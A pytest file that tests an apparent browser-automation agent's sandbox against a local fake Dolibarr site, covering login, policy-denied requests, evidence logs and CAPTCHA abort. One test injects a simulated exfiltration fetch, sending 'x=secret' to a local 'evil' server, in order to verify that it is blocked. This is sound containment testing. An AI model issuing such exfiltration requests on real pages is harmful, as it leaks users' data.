"""The runtime session on a local fake site: containment, evidence for refused requests, login, cleanup. Offline."""

from __future__ import annotations

import json
import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from cua.config import REPO_ROOT, Settings
from cua.control.lease import AUTOMATION, LeaseToken
from cua.control.runtime import Session, login_targets, open_session
from cua.safety.policy import ActionRequest, PolicyDenied
from cua.surface.login import CaptchaRequired

PASSWORD = "pw-for-test-9"
LOGIN_PAGE = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Login</title></head><body>
<form method="POST" action="/index.php"><div title="Enter login details">
<input type="text" name="username" placeholder="Login" aria-label="Login">
<input type="password" name="password" placeholder="Password" aria-label="Password"></div>
<input type="submit" value="Login"></form></body></html>"""
CAPTCHA_PAGE = LOGIN_PAGE.replace("</div>", '<input type="text" name="code" aria-label="Security code"></div>')
HOME_PAGE = "<!DOCTYPE html><html><head><title>Home</title></head><body><h1>Home</h1></body></html>"


class Site:
    def __init__(self, login_page: str = LOGIN_PAGE) -> None:
        self.hits: list[str] = []
        site = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):  # noqa: D102
                pass

            def _send(self, body: str) -> None:
                data = body.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):  # noqa: N802
                site.hits.append(f"GET {self.path}")
                self._send(login_page)

            def do_POST(self):  # noqa: N802
                body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode()
                site.hits.append("POST " + self.path)
                self._send(HOME_PAGE if f"password={PASSWORD}" in body else login_page)

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    @property
    def port(self) -> int:
        return self.httpd.server_address[1]

    def close(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture
def make_site() -> Iterator:
    sites: list[Site] = []

    def make(**kw) -> Site:
        sites.append(Site(**kw))
        return sites[-1]

    yield make
    for s in sites:
        s.close()


@pytest.fixture
def policy_file(tmp_path: Path) -> str:
    path = tmp_path / "policy.json"
    path.write_text(
        json.dumps(
            {
                "version": "cua.policy/v1",
                "name": "unit-test",
                "sandbox": True,
                "origins": ["http://localhost:${DOLIBARR_PORT}"],
                "routes": {"allow": ["/**"], "deny": ["/admin/**"]},
                "actions": ["click", "type", "select", "press", "navigate", "extract"],
                "max_effect": "read",
            }
        ),
        encoding="utf-8",
    )
    return str(path)


def config(site: Site) -> Settings:
    return Settings(dolibarr_port=site.port, cua_run_login="tester", cua_run_password=PASSWORD)


def read_events(session: Session) -> list[dict]:
    text = (session.evidence.run_dir / "events.jsonl").read_text(encoding="utf-8")
    return [json.loads(line) for line in text.splitlines()]


def test_login_targets_come_from_the_primary_role_strategies():
    from cua.artifact.lock import load_profile

    targets = login_targets(load_profile(REPO_ROOT / "apps/dolibarr/profile.json"))
    assert (targets.username.role, targets.username.name) == ("textbox", "Login")
    assert (targets.password.role, targets.password.name) == ("textbox", "Password")
    assert (targets.submit.role, targets.submit.name) == ("button", "Login")


async def test_session_logs_in_and_exposes_the_wired_parts(make_site, policy_file, tmp_path):
    site = make_site()
    async with open_session(
        run_id="rt-login", policy=policy_file, evidence_root=tmp_path, config=config(site)
    ) as session:
        assert session.base_url == f"http://localhost:{site.port}"
        assert session.lease() == LeaseToken(holder=AUTOMATION, generation=0)
        assert session.profile.app == "dolibarr" and session.policy.name == "unit-test"
        obs = await session.surface.observe(screenshot=False)
        assert obs.facts.title == "Home"
        assert session.surface.page.context.browser is not None
        events = read_events(session)
        assert [e["detail"].get("session") for e in events if e["kind"] == "state"] == ["open", "logged_in"]
    manifest = json.loads((tmp_path / "rt-login" / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["status"] == "closed"
    assert PASSWORD not in (tmp_path / "rt-login" / "events.jsonl").read_text(encoding="utf-8")


async def test_login_false_leaves_the_page_blank(make_site, policy_file, tmp_path):
    site = make_site()
    async with open_session(
        run_id="rt-nologin", policy=policy_file, evidence_root=tmp_path, config=config(site), login=False
    ) as session:
        assert session.surface.page.url == "about:blank"
        assert site.hits == []


async def test_blocked_requests_become_policy_events(make_site, policy_file, tmp_path):
    site, evil = make_site(), make_site()
    async with open_session(
        run_id="rt-block", policy=policy_file, evidence_root=tmp_path, config=config(site)
    ) as session:
        page = session.surface.page
        # an in-page request to an origin that is not on the allowlist
        await page.evaluate(f"fetch('http://127.0.0.1:{evil.port}/leak?x=secret').catch(() => null)")
        # a refused path on the allowed origin
        await page.evaluate("fetch('/admin/users').catch(() => null)")
        await page.wait_for_timeout(300)
        # a guard-denied navigation: PolicyDenied, UI untouched
        target = f"http://127.0.0.1:{evil.port}/"
        request = ActionRequest(
            kind="navigate", actor="replay", page_url=page.url, target_url=target, effect="none", lease=session.lease()
        )
        with pytest.raises(PolicyDenied):
            await session.surface.navigate(target, request)
        assert page.url.startswith(session.base_url)
        policy_events = [e for e in read_events(session) if e["kind"] == "policy"]
    assert evil.hits == []
    assert {(e["actor"], e["policy"]["rule"]) for e in policy_events} == {
        ("system", "origin_allowlist"),  # network layer: the in-page fetch
        ("system", "path_rules"),  # network layer: /admin/users
        ("replay", "origin_allowlist"),  # guard: the refused navigate
    }
    guard_event = next(e for e in policy_events if e["actor"] == "replay")
    assert guard_event["action"]["kind"] == "navigate" and guard_event["policy"]["allowed"] is False
    assert guard_event["action"]["target_url"] == f"http://127.0.0.1:{evil.port}/"
    assert all("secret" not in json.dumps(e) for e in policy_events)  # query strings never reach the log


async def test_captcha_propagates_and_everything_is_closed(make_site, policy_file, tmp_path):
    site = make_site(login_page=CAPTCHA_PAGE)
    with pytest.raises(CaptchaRequired):
        async with open_session(
            run_id="rt-captcha", policy=policy_file, evidence_root=tmp_path, config=config(site)
        ):
            pytest.fail("login should not complete")
    manifest = json.loads((tmp_path / "rt-captcha" / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["status"] == "aborted"
    assert site.hits == ["GET /index.php?mainmenu=home&leftmenu=home"]  # nothing was typed or posted
